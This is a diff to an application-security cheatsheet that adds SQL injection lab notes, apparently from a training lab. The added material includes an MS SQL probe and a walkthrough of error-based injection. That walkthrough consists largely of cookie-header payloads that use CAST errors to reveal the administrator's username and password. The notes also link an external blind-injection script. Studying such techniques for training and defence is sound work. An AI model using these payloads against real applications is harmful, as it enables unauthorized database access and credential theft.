@@ -214,6 +214,7 @@ End Goals:
 Analysis:
 
 1) Prove that parameter is vulnerable
+' || (SELECT '') || ' -> MS SQL query
 
 ' || (select '' from dual) || ' -> oracle database 200
 
@@ -232,8 +233,6 @@ According to the SQL query order of execution, above query will execute as follo
 - Determine the data `FROM dual table`
 - Validate the condition `CASE WHEN(1=1)` Since 1=1 is always true,
 - `TO_CHAR(1/0)` evaluated causing Error 500
-
-
 
 3) Confirm that the administrator user exists in the users table  -> 200
 ' || (select '' from users where username='administrator') || ' -> 200
@@ -262,4 +261,31 @@ We can't decide whether particular user available or not
 Some thing like this password  wjuc497wl6szhbtf0cbf
 script here - https://github.com/ashok5141/Application-Security-Cheatsheet/blob/main/Scripts/SQL_Oracle_Blind_Password_Retrive.py 
 script.py <url>
+```
+
+##### Extracting sensitive data via verbose SQL error messages
+- Misconfiguration of the database sometimes results in verbose error messages.
+- These can provide information that may be useful to an attacker.
+- For example, consider the following error message, which occurs after injecting a single quote into an ```id``` parameter:
+```bash
+Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
+```
+- Lab scnario
+- In the backend first make the error with ```'``` then remove the error with ```''``` or ```'--```
+- After that convert the output into integer using as int, then equal to 1
+- Due to the backend limitations characters error is ```Unterminated string``` 
+- Check the users table with username it revealed that their is username as administrator
+- Then check the password with the command
+```bash
+# Here the tracking ID parameter is vulnerable
+Cookie: TrackingId=2PgixIJkC6L2lufE'; session=nCJ4wY37vsVs9bL03Wg3d11A2Emk4K   # Error
+Cookie: TrackingId=2PgixIJkC6L2lufE''; session=nCJ4wY37vsVs9bL03Wg3d11A2Emk4K  # 200 OK
+Cookie: TrackingId=2PgixIJkC6L2lufE'--; session=nCJ4wY37vsVs9bL03Wg3d11A2Emk4 # 200 OK
+Cookie: TrackingId=2PgixIJkC6L2lufE'AND CAST((SELECT 1) AS int)--; session=nCJ4wY37vsVs9bL03Wg3d11A2Emk4K  # Error boolean to interger 
+
+# Error with Unterminated string, might be the backend they limiting the charaters
+
+Cookie: TrackingId='AND 1=CAST((SELECT 1) AS int)--; session=nCJ4wY37vsVs9bL03Wg3d11A2Emk4K  # Error boolean to interger 
+Cookie: TrackingId='+AND+1%3dCAST((SELECT+username+from+users+LIMIT+1)+as+int)--; session=nCJ4wY37vsVs9bL03Wg3d11A2Emk4KjW  # administrator is revealed
+Cookie: TrackingId='+AND+1%3dCAST((SELECT+password+from+users+LIMIT+1)+as+int)--; session=nCJ4wY37vsVs9bL03Wg3d11A2Emk4KjW # administrator's password is revealed
 ```
